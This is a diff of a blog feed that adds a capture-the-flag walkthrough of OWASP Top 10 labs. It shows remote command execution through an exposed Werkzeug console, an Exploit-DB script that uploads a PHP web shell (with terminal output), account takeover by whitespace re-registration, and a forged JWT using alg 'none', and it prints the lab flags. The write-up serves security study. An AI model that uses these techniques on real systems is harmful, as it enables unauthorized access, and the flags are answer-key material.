@@ -228,7 +228,234 @@ That is, <code>nobody</code>. However, I learned that the user &rsquo;nobody&rsq
 <pre tabindex="0"><code>3.16.0</code></pre>
 <p>The hint of the question tells us that the version can be found in <code>/etc/alpine-release</code>.</p>
 <p><img src="image-12.png" alt="alt text"></p>
+<br>
 <h3 id="4-insecure-design">4. Insecure Design</h3>
+<p>Insecure design refers to vulnerabilities that are inherent to the application&rsquo;s architecture. They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or part of it) is falwed from the start.</p>
+<br>
+<p>Navigate to http://10.10.118.28:85 and get into joseph&rsquo;s account. This application also has a design flaw in its password reset mechanism. Can you figure out the weakness in the proposed design and how to abuse it?</p>
+<p>Try to reset joseph&rsquo;s password. keep in mind the method used by the site to validate if you are indeed joseph.</p>
+<p>What is the value of the flag in joseph&rsquo;s account?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{Not_3ven_c4tz_c0uld_sav3_U!}</code></pre>
+<p><img src="image-13.png" alt="alt text">
+<img src="image-14.png" alt="alt text"></p>
+<p>One of the security questions was very easy to guess, and there was no limit on password attempts, which is an insecure design.</p>
+<br>
+<h3 id="5-security-misconfiguration">5. Security Misconfiguration</h3>
+<p>Security Misconfigurations occur when security could have been appropriately configured but was not. Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable.</p>
+<p>Security misconfigurations include:</p>
+<ul>
+<li>Poorly configured permissions on cloud services, like S3 buckets.</li>
+<li>Having unnecessary features enabled, like services, pages, accounts or privileges.</li>
+<li>Default accounts with unchanged passwords.</li>
+<li>Error messages that are overly detailed and allow attackers to find out more about the system.</li>
+<li>Not using HTTP security headers.</li>
+</ul>
+<br>
+<p>Navigate to http://10.10.118.28:86/console to access the Werkzeug console.</p>
+<p>Use the Werkzeug console to run the following Python code to execute the ls -l command on the server:
+<code>import os; print(os.popen(&quot;ls -l&quot;).read())</code></p>
+<p>What is the database file name (the one with the .db extension) in the current directory?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>todo.db</code></pre>
+<br>
+<p>Modify the code to read the contents of the <code>app.py</code> file, which contains the application&rsquo;s source code. What is the value of the <code>secret_flag</code> variable in the source code?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{Just_a_tiny_misconfiguration}</code></pre>
+<p><img src="image-15.png" alt="alt text"></p>
+<br>
+<h3 id="6-vulnerable-and-outdated-components">6. Vulnerable and Outdated Components</h3>
+<p>Occasionally, you may find that the company/entity you&rsquo;re pen-testing is using a program with a well-known vulnerability.
+It requires very little work to exploit its vulnerability because the vulnerability is already well-known. If a company misses a single update for a program they use, it could be vulnerable to any number of attacks.</p>
+<p>Navigate to http://10.10.118.28:84 where you&rsquo;ll find a vulnerable application.
+All the information you need to exploit it can be found online.</p>
+<p>What is the content of the /opt/flag.txt file?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{But_1ts_n0t_my_f4ult!}</code></pre>
+<p><img src="image-16.png" alt="alt text">
+At the very top, the website clearly specifies that the site is built with PHP, MYSQL (procedure functions), and Bootstrap.</p>
+<br>
+<p><img src="image-17.png" alt="alt text">
+I googled <code>procedure functions bootstrap exploit</code> and the first result directs to <code>Exploit-DB</code>, clearly indicating we may be onto something!</p>
+<br>
+<p><img src="image-18.png" alt="alt text">
+I downloaded the exploit and ran it</p>
+<br>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>47887.py  webapp.db
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>└─$ python 47887.py
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>usage: 47887.py <span style="color:#89dceb;font-weight:bold">[</span>-h<span style="color:#89dceb;font-weight:bold">]</span> url
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>47887.py: error: the following arguments are required: url
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Downloads<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>└─$ python 47887.py http://10.10.118.28:84
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>&gt; Attempting to upload PHP web shell...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>&gt; Verifying shell upload...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>&gt; Web shell uploaded to http://10.10.118.28:84/bootstrap/img/KJvupFii50.php
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>&gt; Example <span style="color:#89dceb">command</span> usage: http://10.10.118.28:84/bootstrap/img/KJvupFii50.php?cmd<span style="color:#89dceb;font-weight:bold">=</span>whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>&gt; Do you wish to launch a shell here? <span style="color:#89dceb;font-weight:bold">(</span>y/n<span style="color:#89dceb;font-weight:bold">)</span>: y
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>RCE $ cat /opt/flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>But_1ts_n0t_my_f4ult!<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
+<br>
+<h3 id="7-identification-and-authentication-failures">7. Identification and Authentication Failures</h3>
+<p>Authentication and session management constitute core components of modern web applications.
+<em>Authentication</em> allows users to gain access to web applications by verifying their identities.
+The most common form of authentication is using a username and password.
+If a user enters correct credentials, the server would provide ther users&rsquo; browser with a session cookie. A <em>session cookie</em> is needed because web servers use HTTP(S) to communicate, which is stateless. Attaching session cookies means the server will know who is sending what data. The server can then keep track of user&rsquo;s actions.</p>
+<p>Some common flaws in authentication mechanisms:</p>
+<ul>
+<li>Brute force attacks</li>
+<li>Use of weak credentials</li>
+<li>Weak Session Cookies</li>
+</ul>
+<p>Some mitigation for broekn authentication mechanisms:</p>
+<ul>
+<li>Enforce a strong password policy</li>
+<li>Enforce an automatic lockout after a certain number of attempts</li>
+<li>Implement Multi-Factor Authentication</li>
+</ul>
+<p>Many times, what happens is that developers forget to sanitize the input given by the user in the code of their application. We will focus on a vulnerability that happens because of a developer&rsquo;s mistake but is very easy to exploit, <code>re-registration</code></p>
+<p>Go to http://10.10.118.28:8088 and try to register with <code>darren</code> as your username. You&rsquo;ll see that the user already exists, so try to register <code> darren</code> (whitespace at the start) instead, and you&rsquo;ll see that you are now logged in and can see the content present only in darren&rsquo;s account, which in our case, is the flag that you need to retrieve.</p>
+<br>
+<p>What is the flag that you found in darren&rsquo;s account?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>fe86079416a21a3c99937fea8874b667</code></pre>
+<p><img src="image-19.png" alt="alt text"></p>
+<br>
+<p>Now try to do the same trick and see if you can log in as <code>arthur</code></p>
+
+
+
+
+
+
+<pre tabindex="0"><code>d9ac0f7db4fda460ac3edeb75d75e16e</code></pre>
+<p><img src="image-20.png" alt="alt text"></p>
+<br>
+<h3 id="8-software-and-data-integrity-failures">8. Software and Data Integrity Failures</h3>
+<h4 id="what-is-integrity">What is Integrity?</h4>
+<p>When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified.
+Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications.
+A <code>hash</code> is generally mentioned as a solution for ensuring data integrity.</p>
+<br>
+<p>What is the SHA-256 hash of <code>https://code.jquery.com/jquery-1.12.4.min.js</code>?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=</code></pre>
+<p><img src="image-21.png" alt="alt text"></p>
+<p>When a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser. This token will be repeated on each subsequent request to identify who we are. These session token can come in many forms but are usually assigned via <code>cookies</code>.</p>
+<p>Cookies are key-value pairs that a web application will store on the user&rsquo;s browser and that will be automatically repeated on each request to the website that issued them. This could be a terrible idea security-wise because, cookies are stored on the user&rsquo;s browser, so if the user tampers with the cookie, they could potentially impersonate someone else. The application would suffer from a data integrity failure.</p>
+<p>One solution to this is use some integry mechanisms to guarantee that cookie hasn&rsquo;t been altered by the user. One popular option is <code>JSON Web Tokens (JWT)</code></p>
+<p>JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won&rsquo;t be able to alter the key-value pairs and pass the integrity check.</p>
+<p><img src="image-24.png" alt="alt text">
+JWT token is formed of 3 parts: <code>Header</code>, <code>Payload</code> and <code>Signature</code>.</p>
+<p>A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:</p>
+<ol>
+<li>Modify the header section of the token so that the <code>alg</code> header would contain the value <code>none</code>.</li>
+<li>Remove the signature part.</li>
+</ol>
+<p><img src="image-25.png" alt="alt text"></p>
+<br>
+<p>Try logging into the application as guest. What is guest&rsquo;s account password?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>guest</code></pre>
+<p><img src="image-22.png" alt="alt text"></p>
+<br>
+<p>If your login was successful, you should now have a JWT stored as a cookie in your browser. Press F12 to bring out the Developer Tools.</p>
+<p>What is the name of the website&rsquo;s cookie containing a JWT token?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>jwt-session</code></pre>
+<p><img src="image-23.png" alt="alt text"></p>
+<br>
+<p>Use the knowledge gained in this task to modify the JWT toekn so that the application thinks you are the user &ldquo;admin&rdquo;.</p>
+<p>What is the flag presented to the admin user?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{Dont_take_cookies_from_strangers}</code></pre>
+<br>
+<p>original token: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE5ODk1NzI0fQ.KY3A8a6eVrLrqFt606eVjfMLYLGTRtZAwthimwQO5Lo</code></p>
+<p>We learned that the JWT token is formed of 3 parts.</p>
+<ol>
+<li>Header: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code></li>
+<li>Payload: <code>eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE5ODk1NzI0fQ</code></li>
+<li>Signature: <code>KY3A8a6eVrLrqFt606eVjfMLYLGTRtZAwthimwQO5Lo</code></li>
+</ol>
+<p>Now we can use the encode/decode online tool to modify the contents of the header and remove signature.</p>
+<p>First decode the <code>Header</code> part of the token
+<img src="image-26.png" alt="alt text"></p>
+<br>
+<p>Modify the <code>alg</code> value to <code>none</code>
+<img src="image-27.png" alt="alt text"></p>
+<br>
+<p>Decode the <code>Payload</code> part of the token
+<img src="image-28.png" alt="alt text"></p>
+<br>
+<p>Modify the value of the username to <code>admin</code>
+<img src="image-29.png" alt="alt text"></p>
+<br>
+<p>Remove Signature and combine those modified parts</p>
+<ol>
+<li>Header_modified: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0</code></li>
+<li>Payload_modified: <code>eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE5ODk1NzI0fQ</code></li>
+<li>Combined_token_modified: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE5ODk1NzI0fQ.</code></li>
+</ol>
+<p><em>Notice that I still kept the dot at then end even though we removed the signature part of the token.</em>
+<br></p>
+<p>Replace the value of the cookie to our modified token and refresh the page
+<img src="image-30.png" alt="alt text"></p>
+<br>
 ]]></content:encoded>
     </item>
     <item>
@@ -507,13 +734,6 @@ Last usable address: 192.168.5.226/30</code></pre>
 <li><a href="http://subnetting.org">http://subnetting.org</a></li>
 <li><a href="https://subnettingpractice.com">https://subnettingpractice.com</a></li>
 </ul>
-
-
-
-
-
-
-<pre tabindex="0"><code></code></pre>
 ]]></content:encoded>
     </item>
     <item>
